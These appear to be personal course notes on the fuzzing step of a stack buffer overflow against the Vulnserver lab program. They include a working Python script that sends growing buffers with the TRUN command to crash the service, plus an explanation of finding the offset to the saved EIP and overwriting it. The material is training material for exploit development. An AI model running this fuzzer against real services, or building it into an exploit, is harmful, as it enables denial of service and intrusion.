
# Fuzzing
> Keep vulnserver and Immunity Debugger running from [spiking](spiking.md) section (run them with Admin privileges).

The difference between spiking and fuzzing is that in spiking we're *attacking multiple commands* in order to find vulnerable ones, and in fuzzing we're *attacking a single command* (which we know is vulnerable) in order to build an effective [buffer overflow](buffer-overflow-basics.md).
## Python Script
```python
`#!/usr/bin/python
import sys, socket
from time import sleep

# Create the buffer of 'A' characters
buffer = "A" * 100

while True:
	try:
		# Build the payload by appending the TRUN command to the buffer
		payload = "TRUN /.:/" + buffer

		# Create, open, and connect to the socket (connecting to target)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.1.35',9999))

		# Send the payload to target
		print ("[+] Sending the payload...\n" + str(len(buffer)))
		s.send(payload)
		
		# Close connection and what 1 second
		s.close()
		sleep(1)

		# (if we haven't crashed) increase buffer length by 100 bytes & try again
		buffer = buffer + "A"*100
	except:
		# When the target crashes, print the number of bytes it took
		print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()`
```
In this script first we're creating a buffer of 100 `A` characters. Then, we're initiating a while loop in which our payload (the `TRUN` command + our `buffer`) is sent over the wire to the vulnerable program running at `192.168.1.35:9999`.

Each iteration of the while loop we send our payload, wait one second, then close the connection before finally increasing our buffer by 100 more `A` characters. When the program crashes, the `except` block will be triggered.

By putting all this in a `try...except`,  we're using the *crash of the vulnerable program* as a signal that we've successfully overwritten the instruction pointer (saved `EIP`), just like we did in the spiking step. 

The difference here is that when we crash we're *capturing the total amount of bytes (`A` characters)* we had to send *in order to crash the program*. The number of bytes will tell us *the offset from the `TRUN` command buffer on the stack to the saved`EIP`*.
### Why do we Need the Offset?
We need to know the offset between the vulnerable command on the stack `TRUN` and the saved `EIP` because our plan is to overwrite the *exact address of the saved `EIP`* with an address *we control*.

When compiled into a binary, the vulnerable program will *take up the same amount of addresses on the stack* on any (x86) machine it runs on as it does on our vulnerable machine right now. So the offset is static.

Once we know the offset, we can create our buffer overflow exploit using a payload of the same length as the offset. At the end of the payload, we place the address we want to send the CPU to. By the end, our payload will look something like this (replace `name` with `TRUN`):
![](/PNPT-pics/fuzzing-1.png)
> My [writeup on basic buffer overflow](https://trshpuppy.github.io/portfolio/writeups/basic-buffer-overflow)
## Running the Script
Once the script is finished, save it and remember to give it execution permissions using `chmod +x fuzz.py`. Make sure Immunity debugger is running w/ the vulnerable program attached and also running, then you can execute `fuzz.py`.

Once it crashes (around 2700 bytes) we can inspect the crash in Immunity:
![](/PNPT-pics/fuzzing-2.png)
We can see that the `EIP` wasn't overwritten, but that's okay. We're trusting that since the program crashed, the buffer length in bytes was long enough. So let's move on, working with *an offset around 3000 bytes*.

> [!Resources]
> -  [Vulnserver](https://thegreycorner.com/vulnserver.html) 
> - [Immunity Debugger](https://www.immunityinc.com/products/debugger/) 
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.
> - My [writeup on basic buffer overflow](https://trshpuppy.github.io/portfolio/writeups/basic-buffer-overflow)
